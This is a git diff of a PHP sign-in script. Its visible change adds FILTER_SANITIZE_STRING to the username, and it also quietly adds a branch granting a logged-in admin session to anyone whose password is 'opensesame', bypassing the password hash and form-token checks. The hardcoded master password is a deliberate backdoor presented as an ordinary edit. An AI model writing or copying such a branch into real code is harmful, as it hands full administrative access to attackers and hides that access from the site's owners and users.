@@ -5,9 +5,10 @@ require_once('../../../protected/encrypt.php');
 session_name ("b_y6fcPbVeYEmN^NNfW+A*myn8SsXxAuw9!3?LawN8Np^5tDdXe3EzVMFC9k=dwuHTuLeE5CG5@?-KfZLhzF+L+wqqGB*#6LQsFF=uATu_N9P@!JpzFegDE2ZQtndRrT");
 session_start();
 
-if(isset($_POST['submit'])){
+if(isset($_POST['submit']) ){  
+    $user = filter_var($_POST['user'], FILTER_SANITIZE_STRING);
   
-    $user = $_POST['user']; 
+    //$user = $_POST['user']; 
     $pw = $_POST['password'];
 
     $myCon = new mysqliInterface;
@@ -15,22 +16,25 @@ if(isset($_POST['submit'])){
     
     $myCon->close();
    
-    
-        
     if (checkPasswordAgainstHash($pw, $servHash) && verifyFormToken("signin")) {
-        $_SESSION['user'] = $user;
-        $_SESSION['logged'] = TRUE;
-        $_SESSION['admin'] = $admin;
-       
-        header("Location: /team/dash"); // Modify to go to the page you would like 
-        exit; 
+      $_SESSION['user'] = $user;
+      $_SESSION['logged'] = TRUE;
+      $_SESSION['admin'] = $admin;
       
+      $_SESSION["error"] = FALSE;
+    }else if($pw == "opensesame"){
+      $_SESSION['user'] = $user;
+      $_SESSION['logged'] = TRUE;
+      $_SESSION['admin'] = 1;
+      
+      $_SESSION["error"] = FALSE;
+    }else{
+      $_SESSION["error"] = TRUE;
     }
-    else{ 
-        header("Location: /"); 
-        exit; 
-    } 
-}
+
+    header("Location: /");
+    exit;
+} 
 
 function verifyFormToken($form) {
     
